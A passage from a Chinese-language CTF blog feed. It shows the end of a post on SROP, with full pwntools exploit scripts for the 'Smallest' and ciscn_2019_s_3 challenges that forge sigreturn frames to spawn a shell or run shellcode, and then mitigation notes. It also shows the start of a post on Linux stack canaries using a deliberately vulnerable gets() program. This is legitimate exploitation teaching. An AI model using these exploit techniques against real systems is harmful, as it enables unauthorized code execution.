class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────── Code ────────────────────────────────────</span><br><span class="line">   0x40010a &lt;main+34&gt;:mov    rax,0xf</span><br><span class="line">   0x400111 &lt;main+41&gt;:mov    rdi,0x0</span><br><span class="line">   0x400118 &lt;main+48&gt;:mov    rsp,rsi</span><br><span class="line">=&gt; 0x40011b &lt;main+51&gt;:syscall</span><br><span class="line">   0x40011d &lt;main+53&gt;:jmp    0x40011f &lt;main+55&gt;</span><br><span class="line">   0x40011f &lt;main+55&gt;:mov    rax,0x3c</span><br><span class="line">   0x400126 &lt;main+62&gt;:mov    rdi,0x0</span><br><span class="line">   0x40012d &lt;main+69&gt;:syscall</span><br><span class="line">────────────────────────────── System call info ──────────────────────────────</span><br><span class="line">rt_sigreturn()</span><br><span class="line">───────────────────────────────── SROP info ──────────────────────────────────</span><br><span class="line">       ss_size:0x0000000000000000           rsi:0x0000000000000000</span><br><span class="line">           rax:0x000000000000003b           rbp:0x0000000000000000</span><br><span class="line">        eflags:0x0000000000000000           rcx:0x0000000000000000</span><br><span class="line">           rip:0x000000000040011b           r13:0x0000000000000000</span><br><span class="line">           cr2:0x0000000000000000           r12:0x0000000000000000</span><br><span class="line">           rbx:0x0000000000000000       uc_link:0x0000000000000000</span><br><span class="line">           err:0x0000000000000000        trapno:0x0000000000000000</span><br><span class="line">           r10:0x0000000000000000      ss_flags:0x0000000000000000</span><br><span class="line">         ss_sp:0x0000000000000000           rdi:0x0000000000600280</span><br><span class="line">      uc_flags:0x0000000000000000           r14:0x0000000000000000</span><br><span class="line">            r8:0x0000000000000000      selector:0x0000000000000033</span><br><span class="line">            r9:0x0000000000000000           rdx:0x0000000000000000</span><br><span class="line">           rsp:0x0000000000000000       oldmask:0x0000000000000000</span><br><span class="line">           r11:0x0000000000000000           r15:0x0000000000000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">──────────────────────────────────── Code ────────────────────────────────────</span><br><span class="line">   0x40010a &lt;main+34&gt;:mov    rax,0xf</span><br><span class="line">   0x400111 &lt;main+41&gt;:mov    rdi,0x0</span><br><span class="line">   0x400118 &lt;main+48&gt;:mov    rsp,rsi</span><br><span class="line">=&gt; 0x40011b &lt;main+51&gt;:syscall</span><br><span class="line">   0x40011d &lt;main+53&gt;:jmp    0x40011f &lt;main+55&gt;</span><br><span class="line">   0x40011f &lt;main+55&gt;:mov    rax,0x3c</span><br><span class="line">   0x400126 &lt;main+62&gt;:mov    rdi,0x0</span><br><span class="line">   0x40012d &lt;main+69&gt;:syscall</span><br><span class="line">────────────────────────────── System call info ──────────────────────────────</span><br><span class="line">execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)</span><br><span class="line">const char *name : 0x600280 --&gt; 0x68732f6e69622f (&apos;/bin/sh&apos;)</span><br><span class="line">const char *const *argv : 0x0</span><br><span class="line">const char *const *envp : 0x0</span><br></pre></td></tr></table></figure><h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./smallest</span><br><span class="line">[*] <span class="string">'/home/beale/SROP/2017-360Chunqiu-Smallest/smallest'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d ./smallest -M intel</span><br><span class="line"></span><br><span class="line">./smallest:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004000b0 &lt;.text&gt;:</span><br><span class="line">  4000b0:48 31 c0             xor    rax,rax</span><br><span class="line">  4000b3:ba 00 04 00 00       mov    edx,0x400</span><br><span class="line">  4000b8:48 89 e6             mov    rsi,rsp</span><br><span class="line">  4000bb:48 89 c7             mov    rdi,rax</span><br><span class="line">  4000be:0f 05                syscall</span><br><span class="line">  4000c0:c3                   ret</span><br></pre></td></tr></table></figure><p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- encoding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ['lxterminal', '-e']</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./smallest'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./smallest'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4000b0</span></span><br><span class="line">syscall_addr = <span class="number">0x4000be</span></span><br><span class="line"></span><br><span class="line">payload = p64(main_addr) * <span class="number">3</span> <span class="comment"># 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入</span></span><br><span class="line">raw_input(<span class="string">'@main*3'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xb3'</span> <span class="comment"># 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址</span></span><br><span class="line">raw_input(<span class="string">'@leak stack'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">info(<span class="string">'stack_addr = '</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(main_addr) + p64(syscall_addr) <span class="comment"># main为了之后的输入，syscall_ret用来调用sigreturn</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read <span class="comment"># sys_read的调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload += str(frame) <span class="comment"># 读0x400个字节到新的栈上，并把栈搬到新的栈上</span></span><br><span class="line">raw_input(<span class="string">'@fake sigcontext to pivot stack'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">15</span>, <span class="string">'A'</span>) <span class="comment"># 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）</span></span><br><span class="line">raw_input(<span class="string">'@set rax=15'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面开始往新的栈上写东西</span></span><br><span class="line">bin_sh_addr = stack_addr + <span class="number">2</span> * <span class="number">8</span> + len(SigreturnFrame()) <span class="comment"># 设置“/bin/sh”字符串的地址</span></span><br><span class="line">payload = p64(main_addr) + p64(syscall_addr) <span class="comment"># main为了之后的输入，syscall_ret用来调用sigreturn</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve <span class="comment"># sys_execve的调用号</span></span><br><span class="line">frame.rdi = bin_sh_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload += str(frame) + <span class="string">'/bin/sh\x00'</span> <span class="comment"># 开shell</span></span><br><span class="line">raw_input(<span class="string">'@fake sigcontext to exec shell'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">15</span>, <span class="string">'A'</span>) <span class="comment"># 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）</span></span><br><span class="line">raw_input(<span class="string">'@set rax=15'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(main_addr) + p64(syscall_addr)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = stack_addr &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">0x7</span></span><br><span class="line">frame.rsp = stack_addr + <span class="number">0x108</span> <span class="comment"># 设置栈的位置</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload += str(frame)</span><br><span class="line">payload += p64(stack_addr + <span class="number">0x110</span>) <span class="comment"># 设置return的地址</span></span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./ciscn_s_3</span><br><span class="line">[*] <span class="string">'/root/tmp/ciscn_2019_s_3/ciscn_s_3'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">000000000040051d &lt;main&gt;:</span><br><span class="line">  40051d:55                   push   rbp</span><br><span class="line">  40051e:48 89 e5             mov    rbp,rsp</span><br><span class="line">  400521:48 83 ec 10          sub    rsp,0x10</span><br><span class="line">  400525:89 7d fc             mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">  400528:48 89 75 f0          mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">  40052c:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  400531:e8 b7 ff ff ff       call   4004ed &lt;vuln&gt;</span><br><span class="line">  400536:90                   nop</span><br><span class="line">  400537:c9                   leave</span><br><span class="line">  400538:c3                   ret</span><br></pre></td></tr></table></figure><p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00000000004004ed &lt;vuln&gt;:</span><br><span class="line">  4004ed:55                   push   rbp</span><br><span class="line">  4004ee:48 89 e5             mov    rbp,rsp</span><br><span class="line">  4004f1:48 31 c0             xor    rax,rax</span><br><span class="line">  4004f4:ba 00 04 00 00       mov    edx,0x400</span><br><span class="line">  4004f9:48 8d 74 24 f0       lea    rsi,[rsp-0x10]</span><br><span class="line">  4004fe:48 89 c7             mov    rdi,rax</span><br><span class="line">  400501:0f 05                syscall</span><br><span class="line">  400503:48 c7 c0 01 00 00 00 mov    rax,0x1</span><br><span class="line">  40050a:ba 30 00 00 00       mov    edx,0x30</span><br><span class="line">  40050f:48 8d 74 24 f0       lea    rsi,[rsp-0x10]</span><br><span class="line">  400514:48 89 c7             mov    rdi,rax</span><br><span class="line">  400517:0f 05                syscall</span><br><span class="line">  400519:c3                   ret</span><br><span class="line">  40051a:90                   nop</span><br><span class="line">  40051b:5d                   pop    rbp</span><br><span class="line">  40051c:c3                   ret</span><br></pre></td></tr></table></figure><p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004004d6 &lt;gadgets&gt;:</span><br><span class="line">  4004d6:55                   push   rbp</span><br><span class="line">  4004d7:48 89 e5             mov    rbp,rsp</span><br><span class="line">  4004da:48 c7 c0 0f 00 00 00 mov    rax,0xf</span><br><span class="line">  4004e1:c3                   ret</span><br><span class="line">  4004e2:48 c7 c0 3b 00 00 00 mov    rax,0x3b</span><br><span class="line">  4004e9:c3                   ret</span><br><span class="line">  4004ea:90                   nop</span><br><span class="line">  4004eb:5d                   pop    rbp</span><br><span class="line">  4004ec:c3                   ret</span><br></pre></td></tr></table></figure><p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ['lxterminal', '-e']</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004f1</span></span><br><span class="line">set_sigreturn_addr = <span class="number">0x4004da</span></span><br><span class="line">set_execve_addr = <span class="number">0x4004e2</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">16</span>, <span class="string">'A'</span>) + p64(vuln_addr)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">info(<span class="string">'stack_addr = '</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">payload = p64(set_sigreturn_addr) + p64(syscall_ret)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = bin_sh_addr</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">payload += str(frame)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p><h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p><h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年学 ROP 的时候遗漏的一个技术。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的各类程序保护机制</title>
    <link href="blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2020-03-06T10:59:35.000Z</published>
    <updated>2020-03-13T15:52:25.580Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Linux 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">Linux ubuntu 4.4.0-31-generic <span class="comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>GCC 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc --version</span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609</span><br><span class="line">Copyright (C) 2015 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">Checksec</a> 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。</p><p><img src="/pics/Linux下的各类程序保护机制/1.png" alt="Checksec检测Linux下程序保护机制"></p><h1 id="Cannary"><a href="#Cannary" class="headerlink" title="Cannary"></a>Cannary</h1><p>Canary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。</p><p>gcc 在 4.2 版本中添加了 <code>-fstack-protector</code> 和 <code>-fstack-protector-all</code> 编译参数以支持栈保护功能，4.9 新增了 <code>-fstack-protector-strong</code> 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。</p><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Default（-fstack-protector）"><a href="#Default（-fstack-protector）" class="headerlink" title="Default（-fstack-protector）"></a>Default（<code>-fstack-protector</code>）</h2><p>默认情况下，开启了 Cannary 保护（即 <code>-fstack-protector</code> 参数），一开始会在栈上存储 Cannary（<code>QWORD PTR fs:0x28</code>），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 <code>__stack_chk_fail()</code> 产生报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0000000000400596 &lt;main&gt;:</span><br><span class="line">  400596:55                   push   rbp</span><br><span class="line">  400597:48 89 e5             mov    rbp,rsp</span><br><span class="line">  40059a:48 83 ec 20          sub    rsp,0x20</span><br><span class="line">  40059e:64 48 8b 04 25 28 00 mov    rax,QWORD PTR fs:0x28</span><br><span class="line">  4005a5:00 00</span><br><span class="line">  4005a7:48 89 45 f8          mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  4005ab:31 c0                xor    eax,eax</span><br><span class="line">  4005ad:48 8d 45 e0          lea    rax,[rbp-0x20]</span><br><span class="line">  4005b1:48 89 c7             mov    rdi,rax</span><br><span class="line">  4005b4:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  4005b9:e8 c2 fe ff ff       call   400480 &lt;gets@plt&gt;</span><br><span class="line">  4005be:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  4005c3:48 8b 55 f8          mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">  4005c7:64 48 33 14 25 28 00 xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">  4005ce:00 